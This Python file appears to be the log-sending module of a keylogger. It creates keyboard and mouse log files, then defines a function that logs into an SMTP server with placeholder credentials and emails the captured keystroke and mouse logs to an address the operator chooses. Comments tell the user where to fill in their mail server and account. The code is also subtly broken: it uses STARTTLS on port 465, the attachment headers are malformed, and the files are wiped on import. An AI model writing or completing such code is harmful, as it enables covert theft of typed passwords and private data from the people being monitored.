import smtplib
from email.message import EmailMessage

# Will create new log files if User uses program for first time!
# Not in client_side.py, since this file (send_logs.py) is imported first.
open("logger/Key_logs/mouse_logs.txt", "w")
open("logger/Key_logs/keyboard_logs.txt", "w")


# Function to send an email with two log-files attached
def send_email(subject, message, destination):
    # Here you are to replace smtp.example.com with your Email Providers SMTP Servers and port (For SMTP - Usually 465)
    server = smtplib.SMTP('smtp.example.com', 465)
    server.starttls()
    # This is where you would replace "-------" with your Email and Password to log into your Account
    server.login('-------email-------', '-------password-------')

    msg = EmailMessage()

    message = f'{message}\n'
    msg.set_content(message)
    msg.add_header('Content-Disposition',
                   'attachment',
                   filename='Key_logs/keyboard_logs.txt')
    msg.add_header('ActualContent',
                   'attachment',
                   filename='Key_logs/mouse_logs.txt')
    msg['Subject'] = subject
    msg['From'] = 'IAmSendingThisEmail'
    msg['To'] = destination
    server.send_message(msg)


# Opening Log Files and reading into separate Strings
# Mouse Log
key_logs = open("logger/Key_logs/keyboard_logs.txt")
logs1 = key_logs.read()

# Keyboard Log
mouse_logs = open("logger/Key_logs/mouse_logs.txt")
logs2 = mouse_logs.read()
